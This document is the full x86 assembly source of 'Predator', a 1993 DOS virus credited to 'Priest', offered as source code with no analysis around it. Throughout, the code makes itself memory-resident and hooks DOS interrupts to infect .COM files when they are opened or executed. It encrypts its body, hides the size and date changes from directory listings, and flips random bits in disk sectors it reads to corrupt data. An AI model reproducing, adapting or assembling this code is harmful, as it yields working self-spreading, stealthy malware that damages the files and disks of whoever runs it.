CSEG SEGMENT
     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
     ORG 0h

;                        Source code of the Predator

;                                  Priest


Its_Me          equ 'IM'

Read_Only       equ 1

Mem_Size        equ offset Finish-offset Virus_Start    ;amount of memory needed
                                                        
Virus_Size      equ offset Virus_End-offset Virus_Start ;size of virus
New_Virus_Size  equ offset Finish-offset New_Virus      ;size of virus w/
                                                        ;encryption


Hundred_Years   equ 0c8h

Version         equ 30h                   ;Get DOS Version
Open            equ 3dh                   ;Open File
Ext_Open        equ 6ch                   ;Extended Open File
Execute         equ 4bh                   ;Execute
Find_FCB        equ 11h                   ;Find File Control Block
Find_FCB_Next   equ 12h                   ;Find next FCB
Open_FCB        equ 0fh                   ;Open FCB
Get_DTA         equ 2fh                   ;Get DTA address
Find_Dir        equ 4eh                   ;Find file
Find_Dir_Next   equ 4fh                   ;Find next file

Attribute       equ 1                     ;infection flags
Opened          equ 2
Written         equ 4

Extended_FCB    equ 0ffh                  ;Extended FCB will have the first
                                          ;byte equal to FFh

Virus_Start:    mov sp,bp                 ;restore Stack after decryption
                sti                       ;interrupts on
                mov ah,Version
                mov bx,Its_Me
                int 21h                   ;Check if already resident
                cmp ax,Its_Me
                jne Go_Res
Jump_R_F:       jmp Return_File
Go_Res:         mov ax,cs                 
                dec ax                    ;get segment of this MCB
MCB_ds:         mov ds,ax
                cmp byte ptr ds:[0],'Z'   ;must be last Memory Control Block
                jne Jump_R_F
Found_last_MCB: mov ax,Mem_Size           ;Reserve enough for virus + data
                mov cl,4h                 
                shr ax,cl                 ;convert to paragraphs
                inc ax
                push ax
                dec ax
                shr ax,cl
                shr cl,1
                shr ax,cl                 ;convert to kilobytes
                inc ax                    
                push ds
                xor bx,bx
                mov ds,bx
                sub word ptr ds:[413h],ax  ;take memory from int 12
                pop ds
                pop ax
                sub word ptr ds:[0003h],ax  ;take it from availible memory
                mov ax,cs
                add ax,ds:[0003h]         ;get segment of free memory
                mov es,ax
                push cs
                pop ds
                call $+3             ;next 3 instructions find Virus_Start
                pop si
                sub si,(offset $-1)-offset Virus_Start
                xor di,di
                mov cx,Mem_Size
                cld
                rep movsb                 ;copy us to High Memory
                push es
                mov ax,offset High_Start
                push ax
                retf                      ;jump up there

Virus_Name:     db 'Predator virus  ' 
Copyright:      db '(c) Mar. 93  '
Dedication:     db 'In memory of all those who were killed... Wookies ain''t the only ones that drop!  '
Me:             db 'Priest' 

File_Bytes      db 0cdh, 20h, 0h       ;first 3 bytes of infected .com file

Com_Spec:       db '.COM',0h           ;only .com files can be infected

High_Start:     push cs
                pop ds
                mov ax,3521h           ;get address of Int 21
                int 21h
                mov word ptr ds:[Int_21],bx      ;save it 
                mov word ptr ds:[Int_21+2h],es
                mov al,13h              ;get address of Int 13
                int 21h
                mov word ptr ds:[Int_13],bx     ;save it
                mov word ptr ds:[Int_13+2h],es
                mov ah,25h                   ;point Int 13 to our handler
                mov dx,offset New_13
                int 21h
                mov al,21h                   ;21h too
                mov dx,offset New_21
                int 21h   
                xor ax,ax
                mov ds,ax
                mov ax,ds:[46ch]             ;get a random number for 
                push cs                      ; activation task
                pop ds
                xchg al,ah
                add word ptr ds:[Count_Down],ax     ;Save it for count down
Return_File:    push ss
                pop es
                mov di,100h
                call $+3      ;get address of first 3 bytes of .com file
                pop si
                sub si,(offset $-1)-offset File_Bytes
                push ss
                push di
                cld
                movsw                           ;move them
                movsb
                push ss
                pop ds
                xor ax,ax
                retf                           ;jump to original program



New_21:         cmp ah,Open                    ;check function
                je Infect
                cmp ah,Ext_Open
                je Ext_File_Open
                cmp ah,Execute
                je Infect
                cmp ah,Find_FCB
                je Stealth_FCB
                cmp ah,Find_FCB_Next
                je Stealth_FCB
                cmp ah,Open_FCB
                je Stealth_FCB_O
                cmp ah,Find_Dir
                je Stealth_Dir
                cmp ah,Find_Dir_Next
                je Stealth_Dir
                cmp ah,Version         ;other checking for us
                jne Jump_21
                cmp bx,Its_Me
                jne Jump_21
                mov ax,bx               ;tell other that we're here
Ret_21:         retf 0002h
Jump_21:        jmp cs:Int_21

Stealth_Dir:    jmp Hide_Find
Stealth_FCB:    jmp Hide_FCB
Stealth_FCB_O:  jmp Hide_FCB_O

Infect_Error_J: jmp Infect_Error
Ext_File_Open:  mov word ptr cs:[File_Pnt],si     ;Extended open uses DS:SI
                jmp short Infect_ds
Infect:         mov word ptr cs:[File_Pnt],dx   ;Open & Execute use DS:DX
Infect_ds:      mov word ptr cs:[File_Pnt+2h],ds
                mov byte ptr cs:[Infect_Status],0h  ;zero out progress byte
                call Push_All                    ;Push all registers
                call Hook_24    ;Hook Int 24 to avoid errors being displayed
                call Is_Com                ;Is it a .com file?
                jb Infect_Error_J          ;Carry flag set if it is not
                lds dx,cs:[File_Pnt]       ;get saved address of file name
                mov ax,4300h             ;fetch the attribute
                push ax
                call Old_21
                pop ax
                jb Infect_Error_J
                mov byte ptr cs:[File_Attr],cl  ;save attribute
                test cl,Read_Only   ;no need to change if not read only
                je No_Attr_Rem
                xor cx,cx
                inc al
                call Old_21                 ;if read only, then zero out
                jb Infect_Error_J
                or byte ptr cs:[Infect_Status],Attribute ;update progress byte
No_Attr_Rem:    mov ax,3dc2h              ;open with write/compatibility
                call Old_21
                jb Infect_Error_J
                xchg ax,bx                ;handle into bx
                push cs
                pop ds
                or byte ptr ds:[Infect_Status],Opened ;update progress byte
                mov ax,5700h                      ;get date
                call Old_21
                cmp dh,Hundred_Years            ;is it infected?
                jnb Infect_Error
                add dh,Hundred_Years            ;else add 100 years to date
                mov word ptr ds:[File_Date],dx  ;save modified date
                mov word ptr ds:[File_Time],cx
                mov ah,3fh                      ;read first 3 bytes
                mov cx,3h
                mov dx,offset File_Bytes
                call Old_21
                cmp ax,cx                     ;if error, then quit
                jne Infect_Error
                cmp word ptr ds:[File_Bytes],'MZ' ;no .exe files 
                je Infect_Error
                cmp word ptr ds:[File_Bytes],'ZM'
                je Infect_Error
                mov al,2                ;set file pointer to end of file
                call Set_Pnt
                or dx,dx                ;too big?
                jne Infect_Error
                cmp ax,1000             ;too small?
                jb Infect_Error
                cmp ax,0-2000           ;still too big?
                ja Infect_Error
                mov di,offset Jump_Bytes    ;make a jump to end of file
                push ax
                add ax,100h          ;these two are for the encryption
                mov word ptr ds:[Decrypt_Start_Off+1],ax
                push cs
                pop es
                mov al,0e9h           ;e9h = JMP xxxx
                cld
                stosb
                pop ax
                sub ax,3h             ; to end of file
                stosw
                call Encrypt_Virus    ;encrypt the virus
                mov ah,40h            ;write the encrypted virus and the
                                      ;decryption routine to file
                mov dx,offset New_Virus
                mov cx,New_Virus_Size
                call Old_21
                jb Infect_Error
                or byte ptr ds:[Infect_Status],Written ;update progress byte
                xor al,al                              ;set file pointer to 
                call Set_Pnt                           ;beginning of file
                mov ah,40h                             ;write the jump
                mov dx,offset Jump_Bytes
                mov cx,3h
                call Old_21
Infect_Error:   test byte ptr cs:[Infect_Status],Opened ;was file opened?
                je Set_Attr
                test byte ptr cs:[Infect_Status],Written ;was file written to?
                je Close
                mov ax,5701h            ;if infected, restore modified date
                mov dx,cs:[File_Date]
                mov cx,ds:[File_Time]
                call Old_21
Close:          mov ah,3eh                ;close file
                call Old_21
Set_Attr:       test byte ptr cs:[Infect_Status],Attribute ;attribute changed?
                je Jump_Old_21
                mov ax,4301h              ;if changed, then restore it
                xor cx,cx
                mov cl,cs:[File_Attr]
                lds dx,cs:[File_Pnt]
                call Old_21
Jump_Old_21:    call Unhook_24           ;unhook Int 24
                call Pop_All             ;pop all registers
                jmp Jump_21              ;jump to original int 21

Set_Pnt:        mov ah,42h               ;set file pointer w/ al as parameter
                xor cx,cx
                cwd                      ;zero out dx
                call Old_21
                retn


Pop_All:        pop word ptr cs:[Ret_Add]  ;save return address
                pop es
                pop ds
                pop si
                pop di
                pop bp
                pop dx
                pop cx
                pop bx
                pop ax
                popf
                jmp cs:[Ret_Add]          ;jump to return address

Push_All:       pop word ptr cs:[Ret_Add] ;save return address
                pushf
                push ax
                push bx
                push cx
                push dx
                push bp
                push di
                push si
                push ds
                push es
                jmp cs:[Ret_Add]       ;jump to return address


Hook_24:        call Push_All          ;push all registers
                mov ax,3524h           ;get int 24 address
                call Old_21
                mov word ptr cs:[Int_24],bx   ;save address
                mov word ptr cs:[Int_24+2h],es
                mov ah,25h                     ;set new address to us
                push cs
                pop ds
                mov dx,offset New_24
                call Old_21
                call Pop_All           ;pop all registers
                retn

Unhook_24:      call Push_All
                mov ax,2524h          ;set old address back
                lds dx,cs:[Int_24]
                Call Old_21
                call Pop_All
                retn

New_24:         mov al,3h          ;int 24, fail
                iret

Old_21:         pushf              ;call to original int 21
                call cs:Int_21
                retn

;Hide_Find hides the file size increase for functions 4eh and 4fh and the
;date change


Hide_Find:      call Old_21         ;do the search
                call Push_All       ;push all registers
                jb Hide_File_Error
                mov ah,2fh          ;get DTA address
                call Old_21
                cmp byte ptr es:[bx.DTA_File_Date+1h],Hundred_Years  ;Is it
                jb Hide_File_Error                              ;infected?
                sub byte ptr es:[bx.DTA_File_Date+1h],Hundred_Years ;Take
                                        
                                        ;away 100 years from date

                sub word ptr es:[bx.DTA_File_Size],New_Virus_Size   ;take
                                        
                                        ;away Virus_Size from file size

                sbb word ptr es:[bx.DTA_File_Size+2],0    ;subtract remainder
                                        
                                        ;although there will not be one
                                        ; I included it for expandibility 
                                        ; (i.e. infecting .exe files)
Hide_File_Error:call Pop_All            ;pop all registers
                jmp Ret_21

;Hide_FCB hides the file size increase for functions 11h and 12h and the
;date change


Hide_FCB:       call Old_21        ;find file
                call Push_All      ;push registers
                or al,al           ;al=0 if no error
                jne Hide_FCB_Error
                mov ah,Get_DTA     ;get address of DTA
                call Old_21
                cmp byte ptr ds:[bx],Extended_FCB   ;is it an extended FCB?
                jne Hide_FCB_Reg
                add bx,7h            ;yes, add 7 to address to skip garbage

Hide_FCB_Reg:   cmp byte ptr es:[bx.DS_Date+1h],Hundred_Years ;Is it infected?
                jb Hide_FCB_Error
                sub byte ptr es:[bx.DS_Date+1h],Hundred_Years  ;yes, restore
                                                ;date

                sub word ptr es:[bx.DS_File_Size],New_Virus_Size ;fix size
                sbb word ptr es:[bx.DS_File_Size+2],0  ;and remainder
Hide_FCB_Error: call Pop_All                    ;pop all registers
                jmp Ret_21

;Hide_FCB_O hides the file size increase for function 0fh and the
;date change

Hide_FCB_O:     call Old_21               ;open FCB 
                call Push_All             ;push all registers
                cmp al,0h                 ;al=0 if opened, else error
                jne Hide_FCB_O_Error
                mov bx,dx                 ;pointer into bx

                cmp byte ptr ds:[bx],Extended_FCB ;is it an extended FCB?
                jne Hide_FCB_No_E
                add bx,7h            ;yes, add 7 to skip garbage

Hide_FCB_No_E:  cmp byte ptr ds:[bx.FCB_File_Date+1h],Hundred_Years ;infected?
                jb Hide_FCB_O_Error
                sub byte ptr ds:[bx.FCB_File_Date+1h],Hundred_Years ;yes,
                                                ;fix date

                sub word ptr ds:[bx.FCB_File_Size],New_Virus_Size ;fix size
                sbb word ptr ds:[bx.FCB_File_Size+2h],0  ;and remainder
Hide_FCB_O_Error:call Pop_All         ;pop all registers
                jmp Ret_21

Is_Com:         push cs
                pop ds
                les di,ds:[File_Pnt]  ;get address of file
                xor al,al
                mov cx,7fh
                cld
                repne scasb           ;scan for null byte at end of file name
                cmp cx,7fh-5h        ;must be at least 5 bytes long, 
                                     ;including ext. (.COM)
                jnb Is_Not_Com
                mov cx,5h            ;compare last five bytes to ".COM",0
                sub di,cx
                mov si,offset Com_Spec  ;offset of ".COM",0
                cld
                rep cmpsb             ;compare them
                jne Is_Not_Com
                clc                   ;if .com file, then clear carry flag
                retn
Is_Not_Com:     stc                   ;else set it
                retn

;This is the interrupt 13 handle, it's sole purpose is to complement a
;random bit after a random number of sectors (1-65535) have been read.


New_13:         cmp ah,2h             ;Is a sector going to be read
                je Read_Sector
Jump_13:        jmp cs:Int_13         ;no, continue on
Ret_13:         call Pop_All          ;pop all registers
                retf 0002h
Read_Sector:    mov byte ptr cs:[Sub_Value],al  ;save number of sectors read
                pushf
                call cs:Int_13                  ;read the sectors
                call Push_All                   ;push flags
                jb Ret_13                       ;jump if error to return
                mov al,cs:[Sub_Value]           ;get number of sectors read
                cbw
                sub word ptr cs:[Count_Down],ax ;subtract it from our count
                ja Ret_13                       ;down
                mov bx,200h                     ;200h bytes per sector
                cwd                             ;zero dx
                mul bx                          ;mul # of sectors by 200
                dec ax                          ;minus one
                xor cx,cx
                mov ds,cx
                mov cx,ds:[46ch]                ;get random value
                mov word ptr cs:[Count_Down],cx ;move it into count down
                push cx
                and cx,ax                       ;cx must be < ax
                add bx,cx                       ;add it to the address of 
                pop cx                          ;where the sectors were read
                add cl,ch                       ;randomize cl
                rcr word ptr es:[bx],cl         ;get a random bit
                cmc                             ;reverse it
                rcl word ptr es:[bx],cl         ;put it back
                jmp short Ret_13                ;jump to return 

;The Encrypt_Virus module copies the decryption routine and an encrypted
;copy of the virus to a buffer

Encrypt_Virus:  xor ax,ax
                mov ds,ax
                mov ax,ds:[46ch]    ;get random value
                push cs
                pop ds
                add byte ptr ds:[Decrypt_Value+1h],al  ;use as encryption key 
                mov al,ds:[Decrypt_Value+1h]          ;get encryption key
                add ah,al                             ;randomize ah
                add byte ptr ds:[Decrypt_Random],ah   ;put random garbage 
                mov si,offset Decrypt_Code          ;copy decryption routine
                mov di,offset New_Virus
                mov cx,offset Decrypt_End-offset Decrypt_Code
                cld
                rep movsb                           ;to buffer    
                mov si,offset Virus_Start           ;copy virus
                mov cx,((Virus_Size)/2)+1
Encrypt_Loop:   xchg ax,cx
                push ax
                lodsw
                rol ax,cl                           ;and encrypt
                stosw                               ;to buffer
                pop ax
                xchg ax,cx
                loop Encrypt_Loop
                dec di                              ;fix pointer for
                dec di                              ;decryption routine
                sub di,offset New_Virus     ;point decryption's SP to end of
                                            ;encrypted code for proper
                                            ;decryption

                add word ptr ds:[New_Virus+(Decrypt_Start_Off+1-Decrypt_Code)],di
                retn

;Decryption routine

Decrypt_Code:   mov dx,((Virus_Size)/2)+1
Decrypt_Value:  mov cl,12h
                cli
                mov bp,sp
Decrypt_Start_Off:mov sp,1234h
Decrypt_Loop:   pop ax
                ror ax,cl
                push ax
                jmp short $+3
Decrypt_Random: db 12h
                dec sp
                dec sp
                dec dx
                jne Decrypt_Loop
Decrypt_End:

                db ?
Virus_End:

Jump_Bytes      db 3 dup(0)

Int_13          dd ?                    
Int_21          dd ?
Int_24          dd ?

Ret_Add         dw ?                    

File_Pnt        dd ?

Infect_Status   db ?

File_Time       dw ?
File_Date       dw ?
File_Attr       db ?

Count_Down      dw ?
Sub_Value       db ?

New_Virus       db Virus_Size+(offset Decrypt_End-offset Decrypt_Code)+1 dup(0)
                
Finish:

;various structures

Directory       STRUC
DS_Drive        db ?
DS_File_Name    db 8 dup(0)
DS_File_Ext     db 3 dup(0)
DS_File_Attr    db ?
DS_Reserved     db 10 dup(0)
DS_Time         dw ?
DS_Date         dw ?
DS_Start_Clust  dw ?
DS_File_Size    dd ?
Directory       ENDS

FCB             STRUC
FCB_Drive       db ?
FCB_File_Name   db 8 dup(0)
FCB_File_Ext    db 3 dup(0)
FCB_Block       dw ?
FCB_Rec_Size    dw ?
FCB_File_Size   dd ?
FCB_File_Date   dw ?
FCB_File_Time   dw ?
FCB_Reserved    db 8 dup(0)
FCB_Record      db ?
FCB_Random      dd ?
FCB             ENDS

DTA             STRUC
DTA_Reserved    db 21 dup(0)
DTA_File_Attr   db ?
DTA_File_Time   dw ?
DTA_File_Date   dw ?
DTA_File_Size   dd ?
DTA_File_Name   db 13 dup(0)
DTA             ENDS





CSEG ENDS
     END Virus_Start
